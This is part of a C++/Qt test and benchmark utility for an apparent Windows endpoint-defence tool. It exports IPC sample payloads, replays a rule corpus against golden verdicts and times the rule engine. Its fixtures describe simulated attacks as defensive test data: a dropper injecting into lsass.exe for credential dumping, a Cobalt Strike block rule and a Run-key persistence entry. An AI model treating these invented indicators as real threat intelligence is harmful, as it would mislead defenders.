    addEnvelope(QStringLiteral("LogEntry:含需转义字符与非 ASCII"),
                IpcMessage::createRaw(IpcMessageType::LogEntry,
                                      QString::fromUtf8("引号\" 反斜杠\\ 换行\n 制表\t "
                                                        "控制\x01 中文测试 emoji\xF0\x9F\x94\x92")));
    addEnvelope(QStringLiteral("空负载"),
                IpcMessage::createRaw(IpcMessageType::EventHistoryClearRequest, QString()));
    {
        ProcessActionResultPayload r;
        r.requestId = stableId(QStringLiteral("ipc-env-procact"));
        r.kind = ProcessActionKind::ComputeHash;
        r.pid = 1234;
        r.success = true;
        r.message = QString::fromUtf8("已计算哈希");
        r.sha256 = QStringLiteral("aa11bb22cc33dd44ee55ff6600778899aabbccddeeff00112233445566778899");
        addEnvelope(QStringLiteral("ProcessActionResponse:最大消息号 57"),
                    IpcMessage::create(IpcMessageType::ProcessActionResponse, r.toJson()));
    }
    root[QStringLiteral("envelopes")] = envelopes;

    QJsonObject p;

    p[QStringLiteral("helloDefaults")] = HelloPayload{}.toJson();
    {
        HelloPayload h;
        h.processId = 31337;
        h.role = QString::fromUtf8("服务");
        p[QStringLiteral("helloFilled")] = h.toJson();
    }
    {
        QJsonObject noRole;
        noRole[QStringLiteral("processId")] = 7;
        p[QStringLiteral("helloNoRoleInput")] = noRole;
        p[QStringLiteral("helloNoRoleParsed")] = HelloPayload::fromJson(noRole).toJson();
        QJsonObject emptyRole;
        emptyRole[QStringLiteral("processId")] = 8;
        emptyRole[QStringLiteral("role")] = QString();
        p[QStringLiteral("helloEmptyRoleInput")] = emptyRole;
        p[QStringLiteral("helloEmptyRoleParsed")] = HelloPayload::fromJson(emptyRole).toJson();
    }

    p[QStringLiteral("promptResponseDefaults")] = PromptResponsePayload{}.toJson();
    {
        PromptResponsePayload pr;
        pr.eventId = stableId(QStringLiteral("ipc-prompt"));
        pr.action = VerdictAction::Block;
        pr.remember = true;
        pr.scope = RememberScope::OneDay;
        p[QStringLiteral("promptResponseFilled")] = pr.toJson();
    }

    p[QStringLiteral("eventLogDefaults")] = EventLogPayload{}.toJson();
    {
        bulwark::SecurityEvent e;
        e.id = stableId(QStringLiteral("ipc-evt"));
        e.timestampUtc = t0;
        e.type = EventType::RemoteThread;
        e.actorPid = 2468;
        e.actorPath = QStringLiteral("C:\\Users\\v\\AppData\\Local\\Temp\\dropper.exe");
        e.actorHash = QStringLiteral("aa11bb22cc33dd44ee55ff6600778899aabbccddeeff00112233445566778899");
        e.actorSigned = false;
        e.signatureMismatch = true;
        e.actorFileSize = 1234567LL;
        e.actorPublisher = QString::fromUtf8("某公司(测试)");
        e.actorCertThumbprint = QStringLiteral("DEADBEEF");
        e.certNotAfterUtc = t0.addDays(30);
        e.signingTimeUtc = t0.addDays(-5);
        e.certRevoked = true;
        e.signedAfterCertExpiry = false;
        e.isFirstSeen = true;
        e.originatorPid = 999;
        e.originatorPath = QStringLiteral("C:\\Windows\\System32\\svchost.exe");
        e.parentPid = 1000;
        e.parentPath = QStringLiteral("C:\\Windows\\explorer.exe");
        e.originKind = ProcessOriginKind::Service;
        e.originService = QStringLiteral("Schedule");
        e.originServiceDisplay = QStringLiteral("Task Scheduler");
        e.originDetail = QString::fromUtf8("由服务控制管理器派生");
        e.commandLine = QStringLiteral("\"dropper.exe\" --inject 4242");
        e.target = QStringLiteral("C:\\Windows\\System32\\lsass.exe");
        e.detail = QString::fromUtf8("远程线程入口位于未映射内存");
        e.riskScore = 87;
        e.hasThreatIndicator = true;
        e.matchedRuleNote = QString::fromUtf8("[内置] 远程线程注入 lsass");
        e.userModeObserved = false;
        e.kernelBlocked = true;
        e.memoryInjection = true;
        e.fileDescription = QStringLiteral("Test Dropper");
        e.techniques << QStringLiteral("T1055") << QStringLiteral("T1003.001");
        e.addEvidence(QStringLiteral("InjectionAnalyzer"), EvidenceKind::HardIndicator,
                      QString::fromUtf8("向 lsass 创建远程线程"), 60);
        {
            bulwark::ChainEventInfo c;
            c.timestampUtc = t0.addSecs(-30);
            c.type = EventType::ProcessCreate;
            c.actorPid = 1000;
            c.parentPid = 900;
            c.actorPath = QStringLiteral("C:\\Windows\\explorer.exe");
            c.commandLine = QStringLiteral("explorer.exe");
            c.target = e.actorPath;
            c.riskScore = 10;
            c.originKind = ProcessOriginKind::Interactive;
            c.originLabel = QString::fromUtf8("交互式启动");
            e.chainContext.append(c);
        }

        EventLogPayload el;
        el.event = e;
        el.action = VerdictAction::Block;
        el.source = VerdictSource::Heuristic;
        el.enforcement = bulwark::EnforcementOutcome::KernelBlocked;
        p[QStringLiteral("eventLogFilled")] = el.toJson();

        EventHistoryResponsePayload hist;
        hist.events << el << EventLogPayload{};
        p[QStringLiteral("eventHistoryFilled")] = hist.toJson();
        p[QStringLiteral("eventHistoryEmpty")] = EventHistoryResponsePayload{}.toJson();

        TimelineResponsePayload tr;
        tr.requestId = stableId(QStringLiteral("ipc-timeline-res"));
        tr.events << el;
        tr.scanned = 4096;
        tr.matched = 300;
        tr.truncated = true;
        tr.earliestUtc = t0.addDays(-14);
        tr.message = QString::fromUtf8("已截断到 limit");
        p[QStringLiteral("timelineResponseFilled")] = tr.toJson();
    }
    p[QStringLiteral("timelineResponseDefaults")] = TimelineResponsePayload{}.toJson();

    p[QStringLiteral("skippedDefaults")] = RemediationSkippedItem{}.toJson();
    {
        RemediationSkippedItem s;
        s.target = QStringLiteral("C:\\ProgramData\\evil\\payload.dll");
        s.reason = QString::fromUtf8("文件被占用,无法隔离");
        s.isFile = true;
        p[QStringLiteral("skippedFilled")] = s.toJson();
    }
    {
        p[QStringLiteral("rulesResponseEmpty")] = RulesResponsePayload{}.toJson();
        RulesResponsePayload rr;
        bulwark::DefenseRule r;
        r.id = stableId(QStringLiteral("ipc-rule"));
        r.actorPath = QStringLiteral("C:\\Temp\\evil.exe");
        r.type = EventType::NetworkConnect;
        r.targetPattern = QStringLiteral("1.2.3.4*");
        r.action = VerdictAction::Block;
        r.hardOverride = true;
        r.note = QString::fromUtf8("[情报-ThreatFox] Cobalt Strike (100%)");
        r.createdUtc = t0;
        r.expiresUtc = t0.addDays(7);
        r.actorHashes << QStringLiteral("AA11BB22CC33DD44EE55FF6600778899AABBCCDDEEFF00112233445566778899");
        rr.rules << r;
        p[QStringLiteral("rulesResponseFilled")] = rr.toJson();

        TrustListResponsePayload tl;
        tl.entries << r;
        p[QStringLiteral("trustListFilled")] = tl.toJson();
        p[QStringLiteral("trustListEmpty")] = TrustListResponsePayload{}.toJson();

        IntelApplyRequestPayload ia;
        ia.requestId = stableId(QStringLiteral("ipc-intel-apply"));
        ia.rules << r;
        p[QStringLiteral("intelApplyFilled")] = ia.toJson();

        IntelRefreshResultPayload irr;
        irr.requestId = stableId(QStringLiteral("ipc-intel-res"));
        irr.success = true;
        irr.iocCount = 1234;
        irr.rulesApplied = 42;
        irr.generatedRules << r;
        irr.threatContext << QString::fromUtf8("家族:Cobalt Strike") << QStringLiteral("botnet_cc");
        irr.message = QString::fromUtf8("已生成 42 条规则");
        p[QStringLiteral("intelRefreshResultFilled")] = irr.toJson();
        p[QStringLiteral("intelRefreshResultDefaults")] = IntelRefreshResultPayload{}.toJson();
    }
    {
        DeleteRulePayload d;
        d.ruleId = stableId(QStringLiteral("ipc-del-rule"));
        p[QStringLiteral("deleteRuleFilled")] = d.toJson();
        p[QStringLiteral("deleteRuleDefaults")] = DeleteRulePayload{}.toJson();
        RemoveTrustPayload rt;
        rt.ruleId = d.ruleId;
        p[QStringLiteral("removeTrustFilled")] = rt.toJson();
    }
    p[QStringLiteral("addRuleNoType")] = AddRulePayload{}.toJson();
    {
        AddRulePayload ar;
        ar.actorPath = QStringLiteral("C:\\Program Files\\App\\app.exe");
        ar.type = EventType::FileWrite;
        ar.targetPattern = QString::fromUtf8("C:\\用户数据\\*");
        ar.action = VerdictAction::Ask;
        p[QStringLiteral("addRuleWithType")] = ar.toJson();
    }
    p[QStringLiteral("addTrustDefaults")] = AddTrustPayload{}.toJson();
    {
        AddTrustPayload at;
        at.actorPath = QStringLiteral("D:\\Dev\\build");
        at.note = QString::fromUtf8("开发目录,整目录放行");
        at.isDirectory = true;
        p[QStringLiteral("addTrustDirectory")] = at.toJson();
    }

    p[QStringLiteral("quarantineItemDefaults")] = QuarantineItemPayload{}.toJson();
    {
        QuarantineItemPayload qi;
        qi.id = stableId(QStringLiteral("ipc-quar-item"));
        qi.originalPath = QStringLiteral("C:\\Users\\v\\Downloads\\evil.exe");
        qi.fileName = QStringLiteral("evil.exe");
        qi.quarantinedUtc = t0;
        qi.size = 4294967296LL;
        qi.sha256 = QStringLiteral("aa11bb22cc33dd44ee55ff6600778899aabbccddeeff00112233445566778899");
        qi.reason = QString::fromUtf8("本地规则确认恶意");
        qi.actorPid = 4242;
        p[QStringLiteral("quarantineItemFilled")] = qi.toJson();

        QuarantineListResponsePayload ql;
        ql.items << qi << QuarantineItemPayload{};
        p[QStringLiteral("quarantineListFilled")] = ql.toJson();
        p[QStringLiteral("quarantineListEmpty")] = QuarantineListResponsePayload{}.toJson();

        QuarantineActionPayload qa;
        qa.id = qi.id;
        p[QStringLiteral("quarantineActionFilled")] = qa.toJson();

        QuarantineActionResultPayload qar;
        qar.id = qi.id;
        qar.success = false;
        qar.message = QString::fromUtf8("原路径已存在同名文件,还原失败");
        p[QStringLiteral("quarantineActionResultFilled")] = qar.toJson();
        p[QStringLiteral("quarantineActionResultDefaults")] = QuarantineActionResultPayload{}.toJson();
    }
    {
        ManualQuarantinePayload mq;
        mq.requestId = QUuid{};
        p[QStringLiteral("manualQuarantineDefaults")] = mq.toJson();
        mq.requestId = stableId(QStringLiteral("ipc-manual-quar"));
        mq.path = QStringLiteral("C:\\ProgramData\\evil\\payload.dll");
        p[QStringLiteral("manualQuarantineFilled")] = mq.toJson();

        ManualQuarantineResultPayload mr;
        mr.requestId = mq.requestId;
        mr.success = true;
        mr.message = QString::fromUtf8("已隔离");
        p[QStringLiteral("manualQuarantineResultFilled")] = mr.toJson();
        p[QStringLiteral("manualQuarantineResultDefaults")] = ManualQuarantineResultPayload{}.toJson();
    }

    {
        bulwark::PersistenceEntry e1;
        e1.id = QStringLiteral("run-evil");
        e1.category = bulwark::PersistenceCategory::RegistryRun;
        e1.name = QStringLiteral("Evil");
        e1.location = QStringLiteral("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
        e1.command = QStringLiteral("\"C:\\ProgramData\\evil\\payload.exe\" -s");
        e1.imagePath = QStringLiteral("C:\\ProgramData\\evil\\payload.exe");
        e1.isSigned = false;
        e1.publisher = QString();
        e1.riskScore = 65;
        e1.riskReasons << QString::fromUtf8("未签名") << QString::fromUtf8("位于用户可写目录");
        e1.techniques << QStringLiteral("T1547.001");
        p[QStringLiteral("persistenceEntrySignedFalse")] = e1.toJson();
        e1.isSigned = true;
        e1.publisher = QStringLiteral("Contoso Ltd.");
        p[QStringLiteral("persistenceEntrySignedTrue")] = e1.toJson();
        e1.isSigned.reset();
        p[QStringLiteral("persistenceEntrySignedNull")] = e1.toJson();
        p[QStringLiteral("persistenceEntryDefaults")] = bulwark::PersistenceEntry{}.toJson();

        PersistenceListResponsePayload pl;
        pl.scannedUtc = t0; // 默认是 currentDateTimeUtc(),必须显式给
        pl.entries << e1;
        pl.message = QString::fromUtf8("共 1 项");
        p[QStringLiteral("persistenceListFilled")] = pl.toJson();
        PersistenceListResponsePayload plEmpty;
        plEmpty.scannedUtc = t0;
        p[QStringLiteral("persistenceListEmpty")] = plEmpty.toJson();

        PersistenceCleanupRequestPayload pcq;
        pcq.requestId = stableId(QStringLiteral("ipc-persist-clean"));
        pcq.entry = e1;
        p[QStringLiteral("persistenceCleanupRequestFilled")] = pcq.toJson();

        PersistenceCleanupResultPayload pcr;
        pcr.requestId = pcq.requestId;
        pcr.success = true;
        pcr.entryId = e1.id;
        pcr.message = QString::fromUtf8("已移除注册表值并隔离载荷");
        pcr.quarantinedFiles << QStringLiteral("C:\\ProgramData\\evil\\payload.exe");
        pcr.removedRegistryValues << QStringLiteral("HKCU\\...\\Run\\Evil");
        RemediationSkippedItem sk;
        sk.target = QStringLiteral("C:\\ProgramData\\evil\\locked.dll");
        sk.reason = QString::fromUtf8("文件被占用");
        sk.isFile = true;
        pcr.skipped << sk;
        p[QStringLiteral("persistenceCleanupResultFilled")] = pcr.toJson();
        p[QStringLiteral("persistenceCleanupResultDefaults")] = PersistenceCleanupResultPayload{}.toJson();
    }

    {
        RemediationReportPayload rr;
        rr.timestampUtc = t0; // 默认是 currentDateTimeUtc(),必须显式给
        rr.actorPath = QStringLiteral("C:\\Users\\v\\AppData\\Local\\Temp\\dropper.exe");
        rr.actorPid = 2468;
        rr.reason = QString::fromUtf8("本地规则与行为证据确认恶意");
        rr.actorQuarantined = true;
        rr.quarantinedFiles << QStringLiteral("C:\\ProgramData\\evil\\payload.dll");
        rr.removedRegistryValues << QStringLiteral("HKCU\\...\\Run\\Evil");
        RemediationSkippedItem sk;
        sk.target = QStringLiteral("HKLM\\SYSTEM\\...\\Services\\EvilSvc");
        sk.reason = QString::fromUtf8("需要更高权限");
        sk.isFile = false;
        rr.skipped << sk;
        p[QStringLiteral("remediationReportFilled")] = rr.toJson();
        RemediationReportPayload rrEmpty;
        rrEmpty.timestampUtc = t0;
        p[QStringLiteral("remediationReportEmpty")] = rrEmpty.toJson();
    }

    {
        IntelRefreshRequestPayload ir;
        ir.requestId = QUuid{};
        p[QStringLiteral("intelRefreshRequestDefaults")] = ir.toJson();
        ir.requestId = stableId(QStringLiteral("ipc-intel-req"));
        ir.previewOnly = true;
        p[QStringLiteral("intelRefreshRequestFilled")] = ir.toJson();
    }

    {
        TimelineRequestPayload tq;
        tq.requestId = QUuid{};
        p[QStringLiteral("timelineRequestDefaults")] = tq.toJson();
        tq.requestId = stableId(QStringLiteral("ipc-timeline-req"));
        tq.fromUtc = t0.addDays(-7);
        tq.toUtc = t0;
        tq.types << static_cast<int>(EventType::ProcessCreate)
                 << static_cast<int>(EventType::NetworkConnect);
        tq.actions << static_cast<int>(VerdictAction::Block);
        tq.minRiskScore = 50;
        tq.pid = 4242;
        tq.includeProcessTree = true;
        tq.text = QString::fromUtf8("临时目录");
        tq.limit = 2000;
        p[QStringLiteral("timelineRequestFilled")] = tq.toJson();
    }

    {
        AttackGraphRequestPayload gq;
        gq.requestId = QUuid{};
        p[QStringLiteral("graphRequestDefaults")] = gq.toJson();
        gq.requestId = stableId(QStringLiteral("ipc-graph-req"));
        gq.seedEventId = stableId(QStringLiteral("ipc-evt"));
        gq.rootPid = 1000;
        gq.windowSeconds = 7200;
        p[QStringLiteral("graphRequestFilled")] = gq.toJson();

        p[QStringLiteral("graphResponseDefaults")] = AttackGraphResponsePayload{}.toJson();

        bulwark::AttackGraph g;
        g.seedEventId = stableId(QStringLiteral("ipc-evt"));
        g.rootPid = 1000;
        g.rootLabel = QStringLiteral("explorer.exe");
        g.techniques << QStringLiteral("T1055") << QStringLiteral("T1003.001");
        g.firstUtc = t0.addSecs(-60);
        g.lastUtc = t0;
        g.maxRiskScore = 87;
        g.eventCount = 3;
        g.truncated = false;
        g.summary = QString::fromUtf8("2 个进程 · 3 次行为 · 已拦截 1 次");
        {
            bulwark::AttackGraphNode n;
            n.id = QStringLiteral("p:1000:1768478400000");
            n.kind = bulwark::AttackNodeKind::Process;
            n.label = QStringLiteral("explorer.exe");
            n.detail = QStringLiteral("C:\\Windows\\explorer.exe");
            n.pid = 1000;
            n.parentPid = 900;
            n.path = QStringLiteral("C:\\Windows\\explorer.exe");
            n.commandLine = QStringLiteral("explorer.exe");
            n.signedActor = true;
            n.publisher = QStringLiteral("Microsoft Windows");
            n.riskScore = 10;
            n.blocked = false;
            n.isSeed = false;
            n.isRoot = true;
            n.depth = 0;
            n.originKind = ProcessOriginKind::Interactive;
            n.originLabel = QString::fromUtf8("交互式启动");
            n.eventCount = 1;
            n.firstSeenUtc = t0.addSecs(-60);
            n.lastSeenUtc = t0.addSecs(-60);
            g.nodes.append(n);
        }
        {
            bulwark::AttackGraphNode n;
            n.id = QStringLiteral("File:c:\\programdata\\evil\\payload.dll");
            n.kind = bulwark::AttackNodeKind::File;
            n.label = QStringLiteral("payload.dll");
            n.detail = QStringLiteral("C:\\ProgramData\\evil\\payload.dll");
            n.riskScore = 70;
            n.blocked = true;
            n.eventCount = 1;
            g.nodes.append(n);
        }
        {
            bulwark::AttackGraphEdge e;
            e.eventId = stableId(QStringLiteral("ipc-evt"));
            e.fromId = QStringLiteral("p:1000:1768478400000");
            e.toId = QStringLiteral("File:c:\\programdata\\evil\\payload.dll");
            e.type = EventType::FileWrite;
            e.label = QString::fromUtf8("写入文件");
            e.detail = QString::fromUtf8("释放载荷");
            e.timestampUtc = t0;
            e.riskScore = 70;
            e.action = VerdictAction::Block;
            e.enforcement = bulwark::EnforcementOutcome::KernelBlocked;
            e.hasThreatIndicator = true;
            e.techniques << QStringLiteral("T1105");
            e.inferred = false;
            g.edges.append(e);
            e.eventId = QUuid{};
            e.fromId = QStringLiteral("p:900:0");
            e.toId = QStringLiteral("p:1000:1768478400000");
            e.type = EventType::ProcessCreate;
            e.label = QString::fromUtf8("创建进程");
            e.detail = QString();
            e.riskScore = 0;
            e.action = VerdictAction::Allow;
            e.enforcement = bulwark::EnforcementOutcome::NotApplicable;
            e.hasThreatIndicator = false;
            e.techniques.clear();
            e.inferred = true;
            g.edges.append(e);
        }
        p[QStringLiteral("attackGraphFilled")] = g.toJson();
        p[QStringLiteral("attackGraphEmpty")] = bulwark::AttackGraph{}.toJson();

        AttackGraphResponsePayload gr;
        gr.requestId = stableId(QStringLiteral("ipc-graph-res"));
        gr.success = true;
        gr.message = QString::fromUtf8("已构建");
        gr.graph = g;
        p[QStringLiteral("graphResponseFilled")] = gr.toJson();
    }

    {
        ProcessListRequestPayload pq;
        pq.requestId = QUuid{};
        p[QStringLiteral("processListRequestDefaults")] = pq.toJson();
        pq.requestId = stableId(QStringLiteral("ipc-proc-req"));
        pq.includeCommandLine = false;
        pq.resolveOrigin = false;
        p[QStringLiteral("processListRequestBothOff")] = pq.toJson();

        bulwark::ProcessEntry e;
        e.pid = 4242;
        e.parentPid = 1000;
        e.name = QStringLiteral("svchost.exe");
        e.imagePath = QStringLiteral("C:\\Windows\\System32\\svchost.exe");
        e.commandLine = QStringLiteral("svchost.exe -k netsvcs -p");
        e.parentName = QStringLiteral("services.exe");
        e.userName = QStringLiteral("NT AUTHORITY\\SYSTEM");
        e.startTimeUtc = t0.addSecs(-7200);
        e.workingSetBytes = 8589934592LL;
        e.threadCount = 23;
        e.sessionId = 0;
        e.is64Bit = true;
        e.elevated = true;
        e.isSigned = true;
        e.signatureMismatch = false;
        e.publisher = QStringLiteral("Microsoft Windows Publisher");
        e.fileDescription = QStringLiteral("Host Process for Windows Services");
        e.sha256 = QStringLiteral("aa11bb22cc33dd44ee55ff6600778899aabbccddeeff00112233445566778899");
        e.originKind = ProcessOriginKind::Service;
        e.originService = QStringLiteral("Schedule, BITS");
        e.originServiceDisplay = QStringLiteral("Task Scheduler");
        e.originTask = QString();
        e.originDetail = QString::fromUtf8("由 SCM 派生,置信度高");
        e.isCritical = true;
        e.isProtectedSelf = false;
        e.isTrusted = true;
        e.riskScore = 5;
        e.riskReasons << QString::fromUtf8("共享服务宿主");
        p[QStringLiteral("processEntryFilled")] = e.toJson();
        p[QStringLiteral("processEntryDefaults")] = bulwark::ProcessEntry{}.toJson();

        ProcessListResponsePayload pl;
        pl.requestId = pq.requestId;
        pl.snapshotUtc = t0; // 默认是 currentDateTimeUtc(),必须显式给
        pl.processes << e << bulwark::ProcessEntry{};
        pl.message = QString::fromUtf8("共 2 个进程");
        p[QStringLiteral("processListResponseFilled")] = pl.toJson();

        ProcessActionRequestPayload aq;
        aq.requestId = QUuid{};
        p[QStringLiteral("processActionRequestDefaults")] = aq.toJson();
        aq.requestId = stableId(QStringLiteral("ipc-proc-act-req"));
        aq.kind = ProcessActionKind::QuarantineImage;
        aq.pid = 4242;
        aq.imagePath = e.imagePath;
        p[QStringLiteral("processActionRequestFilled")] = aq.toJson();

        ProcessActionResultPayload ar;
        ar.requestId = aq.requestId;
        ar.kind = ProcessActionKind::Terminate;
        ar.pid = 4242;
        ar.success = false;
        ar.message = QString::fromUtf8("关键系统进程,拒绝结束");
        p[QStringLiteral("processActionResultNoHash")] = ar.toJson();
        ar.kind = ProcessActionKind::ComputeHash;
        ar.success = true;
        ar.message = QString::fromUtf8("已计算");
        ar.sha256 = e.sha256;
        p[QStringLiteral("processActionResultWithHash")] = ar.toJson();
    }

    root[QStringLiteral("payloads")] = p;

    if (!writeJson(path, root))
        return 1;
    out() << "已导出 IPC 线格式样本: " << path << "  " << envelopes.size() << " 个信封, "
          << p.size() << " 个 payload\n";
    out().flush();
    return 0;
}

int benchmark(const QString &corpusPath, int rounds)
{
    QJsonObject corpus;
    if (!readJson(corpusPath, &corpus))
        return 1;

    const QString nowIso = corpus.value(QLatin1String("fixedNowUtc")).toString();
    const QDateTime pinned =
        QDateTime::fromString(nowIso, Qt::ISODateWithMs).toTimeZone(QTimeZone::UTC);
    setFixedNowUtcForTest(pinned);

    RuleEngine engine;
    const QJsonObject eng = corpus.value(QLatin1String("engine")).toObject();
    engine.enableBaseline = eng.value(QLatin1String("enableBaseline")).toBool(true);
    engine.trustSignedActors = eng.value(QLatin1String("trustSignedActors")).toBool(true);
    for (const QJsonValue &v : corpus.value(QLatin1String("selfDirectories")).toArray())
        engine.addSelfDirectory(v.toString());
    for (const QJsonValue &v : corpus.value(QLatin1String("canaryFiles")).toArray())
        engine.addCanaryFile(v.toString());

    QVector<DefenseRule> rules = DefaultRules::build();
    for (const QJsonValue &v : corpus.value(QLatin1String("rules")).toArray())
        rules.push_back(DefenseRule::fromJson(v.toObject()));
    engine.loadRules(rules);

    QVector<SecurityEvent> base;
    for (const QJsonValue &cv : corpus.value(QLatin1String("cases")).toArray())
        base.push_back(SecurityEvent::fromJson(cv.toObject().value(QLatin1String("event")).toObject()));

    for (int w = 0; w < 3; ++w)
        for (const SecurityEvent &src : base) {
            SecurityEvent e = src;
            engine.evaluate(e);
        }

    qint64 best = std::numeric_limits<qint64>::max();
    qint64 total = 0;
    const int reps = 5;
    for (int rep = 0; rep < reps; ++rep) {
        QElapsedTimer t;
        t.start();
        for (int i = 0; i < rounds; ++i)
            for (const SecurityEvent &src : base) {
                SecurityEvent e = src;
                engine.evaluate(e);
            }
        const qint64 ns = t.nsecsElapsed();
        best = qMin(best, ns);
        total += ns;
    }

    const qint64 evts = static_cast<qint64>(rounds) * base.size();
    out() << "规则集 " << rules.size() << " 条,语料 " << base.size() << " 条事件,每轮 "
          << rounds << " 遍 x " << reps << " 次\n";
    out() << "  最快一次: " << (best / 1000000.0) << " ms  ->  "
          << (static_cast<double>(best) / static_cast<double>(evts) / 1000.0)
          << " us/event\n";
    out() << "  平均:     " << (total / reps / 1000000.0) << " ms  ->  "
          << (static_cast<double>(total / reps) / static_cast<double>(evts) / 1000.0)
          << " us/event\n";
    out().flush();
    setFixedNowUtcForTest(QDateTime());
    return 0;
}

void usage()
{
    err() << "用法:\n"
          << "  bulwark_snapshot --bench         <corpus.json> [rounds]\n"
          << "  bulwark_snapshot --gen-corpus    <corpus.json>\n"
          << "  bulwark_snapshot --record        <corpus.json> <golden.json>\n"
          << "  bulwark_snapshot --verify        <corpus.json> <golden.json>\n"
          << "  bulwark_snapshot --check-ruleset\n"
          << "  bulwark_snapshot --dump-rules    <rules.json>\n"
          << "  bulwark_snapshot --dump-models   <models.json>\n"
          << "  bulwark_snapshot --dump-ipc      <ipc.json>\n";
}

}

int main(int argc, char **argv)
{
    // 语料按 C: 是系统盘写成;固定下来,快照结论才与运行机器无关。
    SystemPaths::setSystemDriveForTest(QStringLiteral("c:"));

    QStringList args;
    for (int i = 1; i < argc; ++i)
        args << QString::fromLocal8Bit(argv[i]);

    if (args.isEmpty()) {
        usage();
        return 2;
    }
    const QString mode = args.at(0);

    if (mode == QLatin1String("--check-ruleset")) {
        setFixedNowUtcForTest(fixedNow());
        const int rc = checkRuleset();
        setFixedNowUtcForTest(QDateTime());
        return rc;
    }

    if (mode == QLatin1String("--dump-rules")) {
        if (args.size() != 2) {
            usage();
            return 2;
        }
        setFixedNowUtcForTest(fixedNow());
        const int rc = dumpRules(args.at(1));
        setFixedNowUtcForTest(QDateTime());
        return rc;
    }

    if (mode == QLatin1String("--bench")) {
        if (args.size() < 2) {
            usage();
            return 2;
        }
        const int rounds = args.size() >= 3 ? args.at(2).toInt() : 200;
        return benchmark(args.at(1), rounds > 0 ? rounds : 200);
    }

    if (mode == QLatin1String("--dump-models")) {
        if (args.size() != 2) {
            usage();
            return 2;
        }
        setFixedNowUtcForTest(fixedNow());
        const int rc = dumpModels(args.at(1));
        setFixedNowUtcForTest(QDateTime());
        return rc;
    }

    if (mode == QLatin1String("--dump-ipc")) {
        if (args.size() != 2) {
            usage();
            return 2;
        }
        setFixedNowUtcForTest(fixedNow());
        const int rc = dumpIpc(args.at(1));
        setFixedNowUtcForTest(QDateTime());
        return rc;
    }

    if (mode == QLatin1String("--gen-corpus")) {
        if (args.size() != 2) {
            usage();
            return 2;
        }
        setFixedNowUtcForTest(fixedNow());
        const QJsonObject corpus = buildCorpus();
        setFixedNowUtcForTest(QDateTime());
        if (!writeJson(args.at(1), corpus))
            return 1;
        out() << "已生成语料: " << args.at(1) << "  用例数 "
              << corpus.value(QLatin1String("cases")).toArray().size() << "\n";
        out().flush();
        return 0;
    }

    if (mode == QLatin1String("--record") || mode == QLatin1String("--verify")) {
        if (args.size() != 3) {
            usage();
            return 2;
        }
        QJsonObject corpus;
        if (!readJson(args.at(1), &corpus))
            return 1;

        QVector<CaseResult> results;
        QString nowIso;
        if (!replay(corpus, &results, &nowIso))
            return 1;

        if (mode == QLatin1String("--record")) {
            QJsonObject root;
            root["schema"] = kSchema;
            root["corpusFixedNowUtc"] = nowIso;
            QJsonArray arr;
            for (const CaseResult &r : results) {
                QJsonObject o;
                o["label"] = r.label;
                o["snapshot"] = r.snapshot;
                arr.append(o);
            }
            root["results"] = arr;
            if (!writeJson(args.at(2), root))
                return 1;
            out() << "已记录黄金裁决: " << args.at(2) << "  用例数 " << results.size() << "\n";
            out().flush();
            return 0;
        }

        QJsonObject golden;
        if (!readJson(args.at(2), &golden))
            return 1;
        const int fpBad = checkFpInvariants(results);
        const int failed = compare(golden, results);
        out() << "\n" << results.size() << " 条用例," << failed << " 条不一致"
              << (fpBad ? QStringLiteral(" + fp 不变量违反 %1").arg(fpBad) : QString()) << "\n";
        out().flush();
        return (failed == 0 && fpBad == 0) ? 0 : 1;
    }

    usage();
    return 2;
}
